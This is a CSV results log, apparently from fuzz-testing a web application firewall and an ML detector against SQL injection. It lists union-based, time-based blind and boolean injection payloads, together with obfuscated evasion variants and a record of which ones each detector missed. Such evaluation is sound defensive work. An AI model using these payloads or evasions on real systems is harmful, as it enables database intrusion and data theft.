Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
11,2024-12-17T17:32:58.651832,4.23384E+15,200,200,200,both_correct,'ch' LIke 'ch'.23384E+(selEcT	/**/AND 1),2024-12-17T17:32:59.312072,200,200,both_correct,'ch' LikE 'ch'.23384E+(SeLeCT  AnD  Or 0x674 LIKE 1652),2024-12-17T17:33:02.355548,200,403,waf_correct_ml_incorrect,(SELECT '1Q'<>'1QF').23384E+(sELECT  anD 	|| 0x674 LIke/*~*/0x674),2024-12-17T17:33:06.105235,403,403,both_incorrect,"(sElECT '1Q'<>'1QF').23384E+(seLect  and/**/	||
0x674 LIkE/*Xc""kv*/0x674)",2024-12-17T17:33:10.577891,403,200,waf_incorrect_ml_correct,(SeLect '1Q'!='1QF').23384E+(sElECt /**/AND/**/	||	0x674 LiKe/*z*/0x674),2024-12-17T17:33:15.265833,403,200,waf_incorrect_ml_correct,(sELeCT '1Q' NOT LIKE '1QF').23384E+(sELeCt /**/aND  ||	0x674 lIKe/*'*/0x674),2024-12-17T17:33:19.749070,403,200,waf_incorrect_ml_correct,(select '1Q' not like '1QF').23384E+(seleCt/**//**/aND	 ||	0x674 LiKE/*'*/0x674),2024-12-17T17:33:24.482582,403,200,waf_incorrect_ml_correct,(sElECt '1Q' not like '1QF').23384E+(SELect/**//**/aND   OR 	0x674 liKe 0x674),2024-12-17T17:33:29.345176,403,200,waf_incorrect_ml_correct,"(sELECt '1Q' not like '1QF').23384E+(sELeCT /*uV6*/aNd   || 
0x674 liKe 0x674)",2024-12-17T17:33:34.218087,403,200,waf_incorrect_ml_correct,(selECt '1Q' not like '1QF').23384E+(SELecT  and   ||  0x674 LiKE 0x674),2024-12-17T17:33:38.997069,403,200,waf_incorrect_ml_correct
12,2024-12-17T17:33:43.809609," select * from users where id  =  1 union select @||1,version  (    )   -- 1",403,403,403,both_correct," SeLECt * fROM users WhERE id  = 
(SELECT (SELECT 1)) not like 2542 union sELect @||1,version  (    )/**/  -- 16",2024-12-17T17:33:47.426585,403,403,both_correct," sELECT	* frOm users whERe/**/id   LIKE  
(SelECT (SeLect 1)) not like  and (SeLeCt 5420 NOT LIKE 5421) union seLeCt @||1,version  (    )/*wEs@*/  -- 16",2024-12-17T17:33:53.750089,403,403,both_correct," selECt	* from users WHeRE/**/id   lIKe  	(seLEct (SElECT 174 NOT LIKE  and 1)) not like  AnD (SElecT 5420 not like 5421) union sELEcT @||1,version  (  /*%)^*/ )/**/  -- 0x10",2024-12-17T17:34:01.943923,403,403,both_correct," seLect * FROm users WheRE/**/id   LIKE  	(sELECt (SeLEcT 8752 In ( OR 0,8752,0x2231) not like  And 1)) not like  and (SeLECt 5420 not like 5421) union sELECt @||1,version  (  /*%)^*/ )   -- 0x10F=",2024-12-17T17:34:11.467431,403,403,both_correct," seLect
* froM users wHeRE/*Z&&*/id   LIKe  	(seLECt (SELect  Or 0 in ( oR 0,8752,0x2231) not/**/liKE  anD 1)) not like  and (sElect 5420 not like 1358!=1359) union seleCt @||0x1,version  (  /*%)^*/ )   -- 0x10F=",2024-12-17T17:34:21.701687,403,403,both_correct," SeLEct * FROm users wheRE id   like  	(sEleCT (sElEct  OR 0 in ( oR 0,0x2230,0x2231) not/*m,p*/likE  AnD 1)) not like  And (SeLECT 5420 not like (SELeCt 9148<>9149) not like 1359) union SELeCt @||0x1,version  (  /*%)^*/ )   -- 0x10F=",2024-12-17T17:34:32.897802,403,403,both_correct," seLEct * fRoM users Where id   LikE  
(SeLECt (SEleCT  Or 0 IN ( oR 0,0x2230,0x2231) not/**/like  and 1)) not like  and (SELEcT  AND 1 not like (selEct 4771 NOT LIKE 4772 not like 0x23bd) not like 1359)/**/union SELECT @||0x1,version  (  /*%)^*/ )   -- 0x10F=$4",2024-12-17T17:34:44.951631,403,403,both_correct," SELecT */**/FroM users whERE id   lIke  
(sElect (seLEct  oR 0 in ( Or 0,0x2230,0x2231) not/**/likE  anD 1)) not like	 and (SeLeCT  AND  oR 0 not like (SeleCT 4771 not like 4772 not like 0x23bd) not like 4343 In (4342,4343,(seLeCt 4344)))/**/union selECT @||0x1,version  (  /*%)^*/ )   -- 0x10F=$4@",2024-12-17T17:34:58.622988,403,200,waf_correct_ml_incorrect," seleCT */**/FroM users WhERE id   Like  
(SElEct (SeLECT  oR 0 IN ( ||  AND 1,0x2230,0x2231) not/**/lIkE  AnD 1)) not like
 And (selECt  AnD  Or 0x0 not like (seLeCt 4771 not like 4772 not like 0x23bd) not like 4343 IN ('u
'!='u
0',4343,(SELeCT 4344)))/**/union seLEct @||0x1,version  (/**/ /*%)^*/ )   -- 0x10F=$4@Sg",2024-12-17T17:35:13.735220,403,200,waf_correct_ml_incorrect," SeLEct */**/from users wHeRE id   lIke  
(SElEcT (sELEct  OR 0 In ( ||  and 1,0x2230,0x2231) not/**/liKE  anD 1)) not like
 aNd (SElecT  &&  oR 0x0 not like (SELect  OR 0 not like/**/4772 not like 0x23bd) not like 0x10f7 In ('u
'!='u 'g'='g'',4343,(SeLEct 4344)))/**/union seLECt @||0x1,version  (/**/ /*%)^*/ )   -- 0x10F=$4@Sg_",2024-12-17T17:35:29.935665,403,200,waf_correct_ml_incorrect
13,2024-12-17T17:35:46.509810,collado villalba,200,200,200,both_correct,collado	villalba,2024-12-17T17:35:47.586885,200,200,both_correct,"collado
villalba",2024-12-17T17:35:49.522535,200,200,both_correct,collado/**/villalba,2024-12-17T17:35:51.446891,200,200,both_correct,collado	villalba,2024-12-17T17:35:53.469036,200,200,both_correct,collado/**/villalba,2024-12-17T17:35:55.349409,200,200,both_correct,collado villalba,2024-12-17T17:35:57.396816,200,200,both_correct,collado/**/villalba,2024-12-17T17:35:59.267333,200,200,both_correct,collado villalba,2024-12-17T17:36:01.267240,200,200,both_correct,"collado
villalba",2024-12-17T17:36:03.131055,200,200,both_correct,collado	villalba,2024-12-17T17:36:05.014406,200,200,both_correct
14,2024-12-17T17:36:06.912592,1 where 5443  =  5443,403,200,403,waf_incorrect_ml_correct,1223 NOT LIKE 1224 WhERe (sELeCT 1)/**/ =	 (sELECt 5443),2024-12-17T17:36:08.041301,200,200,both_incorrect," OR 0 NOT/**/LIKE 1224 WhEre (sELECt (SELECT 1))/*0*/  LIKE   (seLecT ',vhnK' NOT LIKE ',vhnK7')",2024-12-17T17:36:11.867903,200,403,waf_incorrect_ml_correct," OR 0x0/**/NOT/**/lIKe 1224 whERe (SelECt (seLect  AND 1))/*2870!=2871*/  lIKe   (SelecT ',vhnK' not
like ',vhnK7')",2024-12-17T17:36:17.484716,200,200,both_incorrect,"	|| 0x0/**/NOT/**/LIKe 1224 wHERE (SeLeCT (SELeCt  ANd 1))/*(SELECT 111 NOT LIKE 112)!=(SELECT 2871)*/  lIkE  /**/(seLeCT ',vhnK' not
like ',vhnK7')",2024-12-17T17:36:24.219751,200,403,waf_incorrect_ml_correct,"	 oR  0x0/**/NOT LIKe 1224 wHERE (seleCT (sEleCT  aNd (SELECT 1)))/*(SELECT ' ' NOT LIKE ' `' NOT LIKE 112)!=(SELECT  AND 1)*/  Like  /**/(SElECt ',vhnK' not	like ',vhnK7')",2024-12-17T17:36:32.396360,200,403,waf_incorrect_ml_correct,"	 or  0x0/**/NOT LIKe 1224 WhERe (SelEct (seLecT  ANd (seLEcT 1)))/*(SELECT ' ' NOT LIKE/**/' `' NOT LIKE 7567<>7568)!=(SELECT  AND  AND (SELECT 1))*/  LIke  /**/(SeLeCT ',vhnK' not like ',vhnK7')",2024-12-17T17:36:41.434642,200,403,waf_incorrect_ml_correct,"
 OR  0x0/**/NOT LIKe 1224 where (sElEcT (SElECt  anD (SeLECt 1)))/*(SELECT ' ' NOT LIKE/**/' `' NOT LIKE (SELECT 7567)<>(SELECT 1)!=741)<>(seLeCt  AnD/**/ anD (sElect 1))*/  lIKe  /**/(seLect ',vhnK' not like ',vhnK7')",2024-12-17T17:36:51.975123,403,403,both_correct,"	 or  0x0/**/NOT LIKe 1224 wHeRe (selECt (SElECT  AnD (select 1)))/*(SELECT ' ' NOT LIKE/**/' `' NOT LIKE (SeLecT 0x1d8f)!=(select  And 4953<>4954)!=741)<>(SeLEct  AND/**/ AND (SElEcT/**/1))*/  LiKE  /**/(sELECT ',vhnK' not like ',vhnK7')",2024-12-17T17:37:03.301622,403,403,both_correct,"
 or  0x0/**/NOT LIKe 7602 NOT LIKE 7603 wHerE (sElect (SElECt  And (seLecT  aNd 1)))/*(SELECT ' ' NOT LIKE/**/' `' NOT LIKE (sELecT 0x1d8f)!=(SelEcT  aND 4953<>4954)!=741)<>(selECT  AND/**/ anD (seLECT/**/(SELECT 1)))*/  likE   (SElEct ',vhnK' not like ',vhnK7')",2024-12-17T17:37:15.767017,403,403,both_correct,"
 or  0x0/**/NOT LIKe 7602 NOT LIKE (SElecT 8068=8068) wHErE (SElEct (SEleCt  and (sELecT  aND 1)))/*(SELECT ' '
NOT LIKE/**/' `' NOT LIKE (selECt 0x1d8f)!=(selECt  anD 4953<>4954) not like 741)<>(SeLeCt  and/**/ and (sELEcT (selECT  OR 0)))*/  lIkE   (sElect ',vhnK' not like ',vhnK7')",2024-12-17T17:37:29.231222,403,403,both_correct
15,2024-12-17T17:37:44.056976,"1%'  )   and make_set  (  8403  =  8403,8899  )   and   (  '%'  =  '",403,403,200,waf_correct_ml_incorrect,"1%'  )   and make_set  (   AND 1  =  2511 NOT LIKE 2512,(SELECT
8899)  )   and/*+Xk1/*/  (  '%'  =  '",2024-12-17T17:37:47.329476,403,403,both_correct,"0x1%'  )   and make_set  (   AND 1  =  2511 NOT LIKE 2512,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' /**/=  '",2024-12-17T17:37:53.162700,403,403,both_correct,"0x1%'  )   and make_set  (   AND 0x26b3 NOT LIKE 9908  =  2511 NOT LIKE  OR	0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%'  =  '",2024-12-17T17:38:00.041397,403,403,both_correct,"0x1%'  )   and make_set  (   AND 0x26b3 NOT LIKE (SELECT 1)  =/**/ ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%'  =  '",2024-12-17T17:38:08.018586,403,403,both_correct,"0x1%'  )   and make_set  (   AND 0x26b3 NOT LIKE (SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 
=  '",2024-12-17T17:38:17.115404,403,403,both_correct,"0x1%' 	)   and make_set  (   AND 0x26b3 NOT LIKE/**/(SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 
=  '",2024-12-17T17:38:26.853365,403,403,both_correct,"0x1%' 	)   and make_set  (   AND 0x26b3	NOT LIKE (SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 
=  '",2024-12-17T17:38:36.962162,403,403,both_correct,"0x1%' 	)   and make_set  ( 	 AND 0x26b3	NOT LIKE (SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT '/**/' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 
=  '",2024-12-17T17:38:46.892870,403,403,both_correct,"0x1%' 	)   and make_set  ( 		AND 0x26b3	NOT LIKE (SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 
=  '",2024-12-17T17:38:56.847871,403,403,both_correct,"0x1%' 	)   and make_set  ( 		AND 0x26b3	NOT LIKE (SELECT (SELECT '$' LIKE '$'))  =  ':@x' NOT LIKE ':@xA' NOT LIKE  OR
0x0,(SELECT (SELECT ' ' LIKE ' '))  )   and/*+Xk1/*/  (  '%' 	= /**/'",2024-12-17T17:39:06.936823,403,403,both_correct
16,2024-12-17T17:39:16.845458,painter.stovin@tetdevelocidad.bn,200,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:18.485224,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:21.118741,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:23.732901,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:26.576591,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:29.286382,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:31.925795,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:34.535869,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:37.127927,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:39.720084,200,200,both_correct,painter.stovin@tetdevelocidad.bn,2024-12-17T17:39:42.336336,200,200,both_correct
17,2024-12-17T17:39:44.935402,hargreav,200,200,200,both_correct,hargreav,2024-12-17T17:39:45.458209,200,200,both_correct,hargreav,2024-12-17T17:39:46.960386,200,200,both_correct,hargreav,2024-12-17T17:39:48.502100,200,200,both_correct,hargreav,2024-12-17T17:39:50.013094,200,200,both_correct,hargreav,2024-12-17T17:39:51.506325,200,200,both_correct,hargreav,2024-12-17T17:39:53.000492,200,200,both_correct,hargreav,2024-12-17T17:39:54.524360,200,200,both_correct,hargreav,2024-12-17T17:39:56.023069,200,200,both_correct,hargreav,2024-12-17T17:39:57.552368,200,200,both_correct,hargreav,2024-12-17T17:39:59.064139,200,200,both_correct
18,2024-12-17T17:40:00.548561,"andia, 113 11g",200,200,200,both_correct,"andia, /**/Or
'm2'='m2' 11g",2024-12-17T17:40:01.313097,200,200,both_correct,"andia,  or
(SELECT (SELECT 1)) LIKE 7548	11g",2024-12-17T17:40:03.657904,403,403,both_incorrect,"andia,  OR
(SEleCt (selEct
(SElEct/**/(SELECT 1)))) LiKe 'O*^6'!='O*^6`'	11g",2024-12-17T17:40:06.814030,403,403,both_incorrect,"andia,  or	(SELECt (SeLeCt
(SelecT (seLecT 'OU/}' like 'OU/}')))) likE 'O*^(SELECT 6)'!='O*^ OR 0`'	11g",2024-12-17T17:40:11.933815,403,403,both_incorrect,"andia, /*[*/Or	(SeLeCt (SELEcT (SeLect (sElect 'OU/}' LIKe 'OU/}')))) Like 'O*^(SELECT 'L""$V8' NOT LIKE 'L""$V8e')' NOT LIKE 'O*^ OR 0x0`'	11g",2024-12-17T17:40:18.049446,403,403,both_incorrect,"andia, /**/Or	(SElEcT (sELecT (selEcT (sELECt 'OU/}' lIKe 'OU/}')))) like 'O*^(SELECT 'L""$V8' NOT LIKE 'L""$V8e')' NOT LIKE 'O*^ OR/**/0x0`'
11g",2024-12-17T17:40:25.985163,403,403,both_incorrect,"andia, /**/oR (seLeCt (sElEct (SelECT (seLEcT 'OU/}' lIkE 'OU/}')))) LIkE 'O*^(SELECT 'L""$V8' NOT LIKE 'L""$V8e')' not like 'O*^ OR 0x0`'
11g",2024-12-17T17:40:34.006940,403,403,both_incorrect,"andia,  oR (sELEct (sELECT (SElect (selECT 'OU/}' LiKe 'OU/}')))) Like 'O*^(SELECT 'L""$V8' NOT LIKE 'L""$V8e')' not like 'O*^ OR 0x0`' 11g",2024-12-17T17:40:42.134348,403,403,both_incorrect,"andia,  oR (SeleCT (Select (SElECT (SElECt 'OU/}' LIke 'OU/}'))))/**/lIKE 'O*^(SELECT 'L""$V8' NOT LIKE
'L""$V8e')' not like 'O*^ OR 0x0`' 11g",2024-12-17T17:40:49.828626,403,403,both_incorrect,"andia,	 or (SeLEct (SElect (SELEct (select 'OU/}' LIKE 'OU/}')))) Like 'O*^(SELECT 'L""$V8' NOT LIKE
'L""$V8e')' not like 'O*^ OR 0x0`' 11g",2024-12-17T17:40:57.702070,403,403,both_incorrect
19,2024-12-17T17:41:05.705374,"1,  (  select   (  case when   (  7734  =  7734  )   then   (  select benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  select 7734 from mysql.db  )   end   )    )   ",403,403,200,waf_correct_ml_incorrect,"994 NOT LIKE 995,  (  seleCT   (  caSe
whEN   (  7734  =  7734  )   tHEn   (  SeLeCT benchmark  (  0x4c4b40,md5  (  0x72747341   )    )     )   ELSe 7734*  (  sELecT  && 1 From mysql.db  )   eNd   )  /*sC*/ )   ",2024-12-17T17:41:14.456877,403,200,waf_correct_ml_incorrect,"(SELECT 994) not like (SELECT 1),  (  SeLEcT   (  CaSe WhEn   (  7734  =  7734  )   tHen   (  SeleCT benchmark  (  0x4c4b40,md5  (  0x72747341   )    )     )   eLse 'U'='U'*  (  SeLect  && 1 frOM mysql.db  )   eNd   )/**/ /*%dFh*/ )   ",2024-12-17T17:41:25.212798,403,200,waf_correct_ml_incorrect,"(seleCt  anD 1) not like (sELEct 1),  (  SELeCt   (  Case When   (  7734  =  7734  )   TheN   (  sElEcT benchmark  (  0x4c4b40,md5  (  0x72747341
  )    )     )   ELSe 'U'='U'*  (  sElect   AnD  (SELECT 8312)!=8313 FRom mysql.db  )   eNd   )  /*w*n&+*/ )   ",2024-12-17T17:41:37.564717,403,200,waf_correct_ml_incorrect,"(seLEcT  AND (SElecT 1)) not like (SeLEcT 1),  (  SElEcT   (  caSe when   ( 
(SElEct 7734)  =  'D' lIKe 'D'  )   Then   (  SeLECt benchmark  (  0x4c4b40,md5  (  0x72747341
  )    )     )   elsE 'U' LIKe 'U'*  (  sELeCt   aND  (SELect 8312)!=8313 FrOm mysql.db/**/ )   end   )  /*w*n&+*/ )   ",2024-12-17T17:41:51.237484,403,200,waf_correct_ml_incorrect,"(sEleCT  And (SElECT 1)) not like (SELECt  AND 1),  (  seLeCT   (  cASE WhEn   ( 
(SElECT 7734)   like   'D' LIKe 'D'  )   THEn   (  selEcT benchmark  (  0x4c4b40,md5  (  0x72747341
  )    )     ) 
 eLSE 'U' lIKE 'U'*  (  sElEcT   and  (SELEcT 0x2078)!='qK' LIKE 'qK' frOm mysql.db/*V*//**/)   eNd   )  /*w*n&+*/ )   ",2024-12-17T17:42:06.054334,403,403,both_correct,"(sElect  AND (SeLect 1331<>1332)) not like (seLecT  aND 1),  (  seLect 
 (  CaSe WHEn   ( 
(SeleCt  Or (seLecT 0))   LikE   'D' LIKE 'D'  )   thEn   (  seLEcT benchmark  (  0x4c4b40,md5  (  0x72747341
  )    )     ) 
 eLSe 'U' LIkE 'U'*  (  selecT   anD  (SElECt 0x2078)/*Hsi*/NOT LIKE 'qK' LikE 'qK' FRom mysql.db/*V*//**/)   end   )  /*w*n&+*/ )   ",2024-12-17T17:42:22.119381,403,403,both_correct,"(SELECt  AnD (seLEct 0x533<>1332)) not like (SEleCt /**/aNd 1),  (  sELeCT 
 (  case wHeN   ( 
(SeLeCT  OR (sElECt 5692<>(SELECT 1)))   LikE   'D' LikE 'D'  )   TheN   (  SElecT benchmark  (  0x4c4b40,md5  (  0x72747341	  )    )     ) 
 elSe 'U' lIke 'U'*  (  select   And  (SelECt 0x2078)/**/not like 'qK' LIKE 'qK' fRom mysql.db/*V*//**/)   end   )  /*w*n&+*/ )   ",2024-12-17T17:42:39.642898,403,200,waf_correct_ml_incorrect,"(SElEct  and (SElect/**/0x533<>'M'!='M,')) not like (seLect /**/anD  aND (SeLEcT 1)),  (  sELect 
 (  CasE WhEN   ( 
(sElEct  OR (selECT 5692<>(sELEct 1)))   lIKe   'D' like 'D'  )   ThEN   (  SELECt benchmark  (  0x4c4b40,md5  (  0x72747341	  )    )     ) 
 eLSe 'U'
lIKE 'U'*  (  sElEcT   ANd  (seLect 0x2078)/**/not like 'qK' LIKE 'qK' fROm mysql.db/**//**/)   eND   )  /*w*n&+*/ )   ",2024-12-17T17:42:58.059555,403,200,waf_correct_ml_incorrect,"(selEcT  aNd (sEleCt 0x533<>'M'!='M,')) not like (seLEcT /**/And  ANd (sELeCT 9859!=0x2684)),  (  selEct 
 (  CAse whEN   ( 
(seLeCt  OR (sELECt  AND 1<>(SeleCT 1)))   LIKE   'D' liKE 'D'  )   thEn   (  sElEct benchmark  (  0x4c4b40,md5  (  0x72747341	  )    )     ) 
 ELse 'U'
LIKE 'U'*  (  selECt   aND  (SEleCT 0x2078)/**/not
like 'qK' lIKe 'qK' fRom mysql.db/*
*//**/)   END   )  /*w*n&+*/ )   ",2024-12-17T17:43:17.708999,403,200,waf_correct_ml_incorrect,"(SeLeCt  aND (SELeCt 0x533 NOT LIKE 'M'!='M,')) not like (sELEct /*n/O&W*/AND  aNd (selECt (selEct 1)!=0x2684)),  (  sELECT 
 (  CASe WheN   ( 
(selEcT  Or (sELEcT  anD (seleCT 1)<>(SeLect 'aH' NOT LIKE 'aHN')))   lIke   'D' lIke 'D'  )   theN   (  SELECt benchmark  (  0x4c4b40,md5  (  0x72747341	  )    )     ) 
 ELSe 'U'	lIKe 'U'*  (  SElEcT   anD  (sElect 0x2078) not
like 'qK' Like 'qK' fRom mysql.db/**//**/)   eND   )  /*w*n&+*/ )   ",2024-12-17T17:43:37.686657,403,200,waf_correct_ml_incorrect
20,2024-12-17T17:43:59.412814,-5708 where 3134  =  3134 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,403,403,403,both_correct,"-(SELECT 5708) WHeRE '
' NOT LIKE '
m'  =  3134 OR 5903   like     (  'qqpjq'||	 ( /**/seLECT CAse 5903 WHEn 5903 thEn 1 eLSe  OR 0 eND froM rdb$database  )  ||'qzvzq'  )  --",2024-12-17T17:44:05.999632,403,403,both_correct,"-(SeLecT 5708) WhERE ' '/**/NOT LIKE '
m'  =  3134 or (seLeCT 6117)=6117   lIKe     (  'qqpjq' or 	 ( /*a*/SELECT CaSE 5903 when (SEleCT 1) then 1 elSE  Or 0 EnD from rdb$database  )  ||'qzvzq'  )  --",2024-12-17T17:44:15.340944,403,403,both_correct,-(SeLEcT 5708) WhErE ' '/**/NOT LIKE '	m'  =  3134 oR (select 6117) LIKe (SeLect  AnD 1)   LiKe     (  'qqpjq' oR 	 ( /*a*/seLECt casE 5903 wHEN (SelECT 1) thEN 1 ElsE  or 6922 LiKE 6922 END fRoM rdb$database  )  ||'qzvzq'  ) /**/--,2024-12-17T17:44:26.082025,403,403,both_correct,-(sEleCt 5708) WhERE ' '/**/not like '	m'  =  0xc3e or (SEleCT 6117)/**/LiKe (seLecT  AND  OR 0) 	 LIKe     (  'qqpjq' Or 	 ( /*a*/SelEcT case 5903 wHen (sELeCt 372<>373) THeN 1 eLsE  OR 6922 likE 6922 END fROm rdb$database  )  ||'qzvzq'  ) /*)[*/--,2024-12-17T17:44:38.016397,403,200,waf_correct_ml_incorrect,-(SeLEcT 5708) WHerE ' ' not like '	m'  =  0xc3e or (SElEcT 0x17e5)/*H*/LIke (seLECT  AnD  Or ')' not like ');') 	 likE     (  'qqpjq' oR   ( /**/seLect cAsE 5903 WHEN (SeLecT 372<>373) THen 1 ELse  or  or 0 Like 6922 ENd FroM rdb$database  )  ||'qzvzq'  ) /*)[*/--,2024-12-17T17:44:51.051683,403,403,both_correct,-(sElECt  || 0) WhEre ' ' not like ' m'  =  0xc3e or (sELEct 0x17e5)/*{q@$E*/LiKe (sELEct  anD  Or ')' not like ');') 	 LIkE/**/    (  'qqpjq' or   ( /**/SELEcT CaSE 5903 whEN (sELECt (SeLect 372)<>373) thEn 1 ELse  Or  or 866<>867 likE 6922 EnD from rdb$database  )  ||'qzvzq'  ) /*)[*/--,2024-12-17T17:45:04.536662,403,200,waf_correct_ml_incorrect,"-(SelEcT  || 0) WHEre ' ' not like ' m'   like   0xc3e oR (selECT 0x17e5)/*q^E*/LiKe (SeleCT  ANd  Or ')' not like ');') 
 lIke/**/    (  'qqpjq' oR   ( /**/SelECt casE 5903/**/whEn (sEleCt (seLECt 372)<> OR 0) tHEn 9178=9178 ELse  or  OR 866<>867 LIKE 0x1b0a enD fROM rdb$database  )  ||'qzvzq'  ) /*)[*/--",2024-12-17T17:45:19.486335,403,403,both_correct,-(SeLeCt  || 0) WHeRe ' ' not like ' m'   likE   0xc3e oR (SEleCT 0x17e5)/*q^E*/lIkE (SElect /**/AND  or ')' not like ');') 	 like/**/    (  'qqpjq' or   ( /**/SElECt cAse 't9CY='!='t9CY=w'/**/wHEn (SEleCt (SeLeCt (seLEct 1))<> Or 0) Then (sELECt 9178)=9178 ELsE  oR  Or 866<>867 liKE 0x1b0a EnD FrOm rdb$database  )  ||'qzvzq'  ) /*)[*/--,2024-12-17T17:45:35.206676,403,200,waf_correct_ml_incorrect,"-(SeLect  || 0x0) wHErE ' ' not like ' m'   like   0xc3e oR (sEleCT 0x17e5)/*q^E*/lIkE (SeLEcT /**/aNd  Or ')' not like ');') 
 likE/**/    (  'qqpjq' oR   ( /**/sElEcT caSe 't9CY='!='t9CY=w' WHEn (seLECt (SELEct (SeLEcT 1))<> oR 'M8'<>'M8|') THEn (SELeCt 9178)=9178 elsE  oR  oR  OR 0 NOT LIKE 867 LiKE 0x1b0a END FROM rdb$database  )  ||'qzvzq'  ) /*)[*/--",2024-12-17T17:45:52.373911,403,403,both_correct,"-(sELeCT  || 0x0) WHerE ' ' not like ' m'   lIkE   0xc3e Or (seLeCt 0x17e5)/**/lIke (seleCt /**/And  OR ')' not like ');') 
 likE/* */    (  'qqpjq' or   ( /**/sELecT caSE 't9CY='!='t9CY=w' whEN (SeLeCt (SelecT (seLECT/**/1))<> OR 'M8'<>'M8|') Then (seLeCt  AND 1)=1239=1239 elsE  oR  oR  || 0 NOT LIKE 0x363 LikE 0x1b0a ENd From rdb$database  )  ||'qzvzq'  ) /*)[*/--",2024-12-17T17:46:10.581039,403,200,waf_correct_ml_incorrect
